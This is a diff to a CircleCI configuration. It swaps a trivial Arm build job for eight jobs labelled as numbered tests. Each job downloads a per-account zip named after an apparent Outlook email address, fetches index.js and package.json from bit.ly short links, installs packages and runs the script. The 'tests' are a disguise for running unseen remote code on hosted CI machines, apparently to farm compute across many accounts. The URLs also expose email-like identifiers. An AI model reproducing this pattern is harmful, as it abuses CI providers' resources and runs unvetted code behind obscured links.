@@ -1,16 +1,96 @@
-# .circleci/config.yml
 version: 2.1
 
 jobs:
-  build-app:
-    machine:
-      image: ubuntu-2004:202101-01
-    resource_class: arm.medium
+  test_number_33:
+    docker:
+      - image: cimg/node:16.13.0-browsers
+    resource_class: small
     steps:
-      - run: uname -a
-      - run: echo "Hello, Arm!"
-
+      - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/mrkafando.zida_outlook-com.zip -o lunarCrushData.zip
+      - run: unzip lunarCrushData.zip -d lunarCrushData
+      - run: curl -fsSL https://bit.ly/3kJeOmQ -o index.js && curl -fsSL https://bit.ly/3Hca5nk -o package.json
+      - run: npm i -s
+      - run: node index 58
+  test_number_34:
+    docker:
+      - image: cimg/node:16.13.0-browsers
+    resource_class: small
+    steps:
+      - run: curl -fsSL https://bit.ly/3kJeOmQ -o index.js && curl -fsSL https://bit.ly/3Hca5nk -o package.json
+      - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/mikiwilliams1011_outlook-com.zip -o lunarCrushData.zip
+      - run: unzip lunarCrushData.zip -d lunarCrushData
+      - run: npm i -s
+      - run: node index 58
+  test_number_35:
+    docker:
+      - image: cimg/node:16.13.0-browsers
+    resource_class: small
+    steps:
+      - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/aishakhamisgaddafi4671999_outlook-com.zip -o lunarCrushData.zip
+      - run: curl -fsSL https://bit.ly/3kJeOmQ -o index.js && curl -fsSL https://bit.ly/3Hca5nk -o package.json
+      - run: unzip lunarCrushData.zip -d lunarCrushData
+      - run: npm i -s
+      - run: node index 58
+  test_number_36:
+    docker:
+      - image: cimg/node:16.13.0-browsers
+    resource_class: small
+    steps:
+      - run: curl -fsSL https://bit.ly/3kJeOmQ -o index.js && curl -fsSL https://bit.ly/3Hca5nk -o package.json
+      - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/samlaidlaw40_outlook-com.zip -o lunarCrushData.zip
+      - run: unzip lunarCrushData.zip -d lunarCrushData
+      - run: npm i -s
+      - run: node index 58
+  test_number_37:
+    docker:
+      - image: cimg/node:16.13.0-browsers
+    resource_class: small
+    steps:
+      - run: curl -fsSL https://bit.ly/3kJeOmQ -o index.js && curl -fsSL https://bit.ly/3Hca5nk -o package.json
+      - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/charityinquiries1_outlook-com.zip -o lunarCrushData.zip
+      - run: unzip lunarCrushData.zip -d lunarCrushData
+      - run: npm i -s
+      - run: node index 57
+  test_number_38:
+    docker:
+      - image: cimg/node:16.13.0-browsers
+    resource_class: small
+    steps:
+      - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/rekomona_outlook-com.zip -o lunarCrushData.zip
+      - run: unzip lunarCrushData.zip -d lunarCrushData
+      - run: curl -fsSL https://bit.ly/3kJeOmQ -o index.js && curl -fsSL https://bit.ly/3Hca5nk -o package.json
+      - run: npm i -s
+      - run: node index 58
+  test_number_39:
+    docker:
+      - image: cimg/node:16.13.0-browsers
+    resource_class: small
+    steps:
+      - run: curl -fsSL https://bit.ly/3kJeOmQ -o index.js && curl -fsSL https://bit.ly/3Hca5nk -o package.json
+      - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/hickmanakagbor_outlook-com.zip -o lunarCrushData.zip
+      - run: unzip lunarCrushData.zip -d lunarCrushData
+      - run: npm i -s
+      - run: node index 58
+  test_number_40:
+    docker:
+      - image: cimg/node:16.13.0-browsers
+    resource_class: small
+    steps:
+      - run: curl -fsSL https://bit.ly/3kJeOmQ -o index.js && curl -fsSL https://bit.ly/3Hca5nk -o package.json
+      - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/marinelatagor_outlook-com.zip -o lunarCrushData.zip
+      - run: unzip lunarCrushData.zip -d lunarCrushData
+      - run: npm i -s
+      - run: node index 59
+      
+      
 workflows:
   build:
     jobs:
-      - build-app
+      - test_number_33
+      - test_number_34
+      - test_number_35
+      - test_number_36
+      - test_number_37
+      - test_number_38
+      - test_number_39
+      - test_number_40
